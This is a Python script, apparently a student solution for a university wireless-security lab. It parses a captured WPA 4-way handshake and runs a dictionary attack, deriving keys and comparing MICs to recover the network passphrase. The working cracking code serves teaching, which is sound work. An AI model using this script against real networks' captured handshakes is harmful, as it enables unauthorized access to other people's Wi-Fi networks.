#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- Derive WPA keys from Passphrase and 4-way handshake info

- Calculate an authentication MIC (the mic for data transmission uses the
Michael algorithm. In the case of authentication, we use SHA-1 or MD5)
"""

__author__      = "Abraham Rubinstein"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2_math import pbkdf2_hex #contains function to calculate 4096 rounds on passphrase and SSID
from numpy import array_split
from numpy import array
from pbkdf2 import *
import hmac, hashlib


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
wpa=rdpcap("C:\\Users\\micbo\\HEIGVD-SWI-Labo4-WPA\\files\\wpa_handshake.cap")


# We analyze the capture and take the EAPOL (Handshake packets) in the order of apparition and the beacons to be able to get the SSID
list_eapol = []
list_beacons = []
for packet in wpa:
    if packet.haslayer(EAPOL):
        list_eapol.append(packet)
    if packet.haslayer(Dot11):
        list_beacons.append(packet)

# Important parameters for key derivation - some of them can be obtained from the pcap file
passPhrase  = "actuelle" #this is the passphrase of the WPA network
A           = "Pairwise key expansion" #this string is used in the pseudo-random function and should never be modified
# We can recover the SSID from the beacon frame
ssid        = list_beacons[0].info # "SWI"
# We can recover here the src MAC of the first handshake frame
APmac       = a2b_hex(list_eapol[0].addr2.replace(":","")) # a2b_hex("cebcc8fdcab7") #MAC address of the AP
# We can recover the dst MAC of the first handshake frame
Clientmac   = a2b_hex(list_eapol[0].addr1.replace(":","")) # a2b_hex("0013efd015bd") #MAC address of the client

# Authenticator and Supplicant Nonces
# The Nonce are on the load of the frame at some exact positions than we can recover by simply get this intervals
ANonce      = a2b_hex(list_eapol[0].load.hex()[26:90]) # a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")
SNonce      = a2b_hex(list_eapol[1].load.hex()[26:90]) # a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")

B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# Take a good look at the contents of this variable. Compare it to the Wireshark last message of the 4-way handshake.
# In particular, look at the last 16 bytes. Read "Important info" in the lab assignment for explanation
# We can see that the mic is all 0 so we've done something dirty to not get it and adjust the length of the data to left with 0
# We need to recover some things about the Authentication frames
data = ( "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].version,4)[2:] + "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].type,4)[2:] + "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].len,6)[2:] + list_eapol[3].load.hex()[:153]).ljust(198,'0') # a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") 
data = a2b_hex(data)

# This is the MIC contained in the 4th frame of the 4-way handshake. I copied it by hand.
# When trying to crack the WPA passphrase, we will compare it to our own MIC calculated using passphrases from a dictionary
# Same as the Nonces it's on some interval on the load of the last Handshake
mic_to_test = list_eapol[3].load.hex()[154:-4] # "36eef66540fa801ceee2fea9b7929b40"

words = []
# Here we load our dictionnary and put it on a list to test each word
words = [word.rstrip('\n') for word in open("C:\\Users\\micbo\\HEIGVD-SWI-Labo4-WPA\\files\\dictionary")]
success = False
for word in words:
	print("\n\nValues used to derivate keys")
	print("============================")
	print("Passphrase: ",word,"\n")
	print("SSID: ",ssid,"\n")
	print("AP Mac: ",b2a_hex(APmac),"\n")
	print("CLient Mac: ",b2a_hex(Clientmac),"\n")
	print("AP Nonce: ",b2a_hex(ANonce),"\n")
	print("Client Nonce: ",b2a_hex(SNonce),"\n")

	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
	word = str.encode(word)
	#ssid = str.encode(ssid)
	pmk = pbkdf2(hashlib.sha1,word, ssid, 4096, 32)

	#expand pmk to obtain PTK
	ptk = customPRF512(pmk,str.encode(A),B)

	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
	mic = hmac.new(ptk[0:16],data,hashlib.sha1)

	print ("\nResults of the key expansion")
	print ("=============================")
	print ("PMK:\t\t",pmk.hex(),"\n")
	print ("PTK:\t\t",ptk.hex(),"\n")
	print ("KCK:\t\t",ptk[0:16].hex(),"\n")
	print ("KEK:\t\t",ptk[16:32].hex(),"\n")
	print ("TK:\t\t",ptk[32:48].hex(),"\n")
	print ("MICK:\t\t",ptk[48:64].hex(),"\n")
	print ("MIC:\t\t",mic.hexdigest(),"\n")
	print ("MIC to test:\t\t",mic_to_test,"\n")

	if mic.hexdigest()[0:32] == mic_to_test:
		print("Success ! With this passphrase " + str(word))
		success = True
		break
if not success:
    print("No passphrase match")
